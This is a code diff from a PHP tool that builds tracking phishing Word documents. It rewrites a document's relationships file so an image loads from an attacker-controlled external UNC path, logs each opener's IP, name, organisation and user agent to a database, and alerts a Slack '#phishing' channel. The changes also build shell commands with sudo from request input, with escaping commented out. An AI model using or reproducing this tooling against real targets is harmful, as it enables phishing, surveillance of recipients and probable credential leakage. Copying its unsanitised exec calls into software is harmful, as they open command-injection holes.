@@ -17,16 +17,16 @@ if(isset($_REQUEST['slackurl'])){$slackurl = $_REQUEST['slackurl'];
 }
 else
 // ------------------------ SET THIS WEBHOOK MANUALLY --------------------------------------------------------------------------
-{$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_TOKEN_HERE";}
+{$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_WEBHOOK_URL_HERE";}
 if(isset($_REQUEST['slackchannel'])){$slackchannel = $_REQUEST['slackchannel']; $slackchannel = stripslashes($slackchannel);
 }
 else
-{$slackchannel = "#SET_YOUR_DEFAULT_SLACK_CHANNEL_HERE";}
+{$slackchannel = "#phishing";}
 $slackemoji = ":page_facing_up:";
 $slackbotname = "Phished_Document";
 // ------------------------ SET THIS MANUALLY ----------------------------------------------------------------------------------
-$APIResultsURL = "https://YOUR_API_DOMAIN_HERE/phishingdocs/results";
-$uniqueid = uniqid();
+$APIResultsURL = "https://YOUR_API_DOMAIN_HERE.com/phishingdocs/results";
+//$uniqueid = uniqid();
 
 // Cleans up Input
 $slackurl = str_replace('"', "", $slackurl);
@@ -40,10 +40,14 @@ $targetset = isset($_REQUEST['Target']);
 if($targetset == 'false'){
 $slackurl = mysqli_real_escape_string($conn, $slackurl);
 $slackchannel = mysqli_real_escape_string($conn, $slackchannel);
-$uniqueid = mysqli_real_escape_string($conn, $uniqueid);
+//$uniqueid = mysqli_real_escape_string($conn, $uniqueid);
 
-$sqlselect0 = "CALL CreateNotificationRef('Slack','$slackurl','$slackchannel','$uniqueid');";
+$sqlselect0 = "CALL CreateNotificationRef('Slack','$slackurl','$slackchannel');";
 $resultselect0 = $conn->query($sqlselect0);
+
+while($rowselect0 = $resultselect0->fetch_assoc()) {
+$uniqueid = $rowselect0["UUID"];
+}
 }
 
 printf($conn->error);
@@ -116,7 +120,7 @@ $useragent = mysqli_real_escape_string($conn3, $useragent);
 $useragent = stripslashes($useragent);
 
 // Inserts Captured Information Into MySQL DB
-$sqlinsert = "CALL InsertRequests('$ip','$target','$org','$useragent');";
+$sqlinsert = "CALL InsertRequests('$ip','$target','$org','$useragent','$id');";
 $resultinsert = $conn3->query($sqlinsert);
 
 printf($conn3->error);
@@ -125,7 +129,7 @@ $conn3->close();
 // Prepares Message for Slack
 if($target != "" && $org != ""){
 
-$orglink = "<".$APIResultsURL."|".$org.">";
+$orglink = "<".$APIResultsURL."?UUID=".$id."|".$org.">";
 
 $message = "> Document opened by ".$target." at ".$orglink." on ".$browser['platform']."!";
 
@@ -154,7 +158,7 @@ if($target == "" && $org == ""){
 // Send to Slack
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
 
-//$cmd = escapeshellcmd($cmd);
+//echo $cmd;
 exec($cmd);
 
 }
@@ -492,15 +496,12 @@ $cmd4 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[0]).'\\"~'.stripsla
 exec($cmd4,$output4);
 
 //var_dump($output4);
-//echo $cmd4;
 
-    $cmd5 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\'.stripslashes($URL).'/phishingdocs.jpg\\ "TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+$cmd5 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\'.stripslashes($URL).'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
 //$cmd5 = escapeshellcmd($cmd5);
 exec($cmd5,$output5);
 
 //var_dump($output5);
-//echo $cmd5;
-
 $cmd6 = "cd /var/www/uploads/ && sudo zip -r Phishing.docx word/_rels/document.xml.rels;";
 //$cmd6 = escapeshellcmd($cmd6);
 exec($cmd6, $output6);
